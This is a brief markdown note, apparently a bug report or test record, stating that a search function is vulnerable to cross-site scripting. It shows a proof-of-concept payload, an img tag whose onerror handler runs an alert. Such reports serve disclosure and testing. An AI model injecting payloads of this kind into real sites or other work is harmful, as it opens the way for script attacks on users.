# XSS

The following listing causes an XSS via the search function:

```
<img src=0 onerror="alert('This popup should not trigger, but it does')">  
```
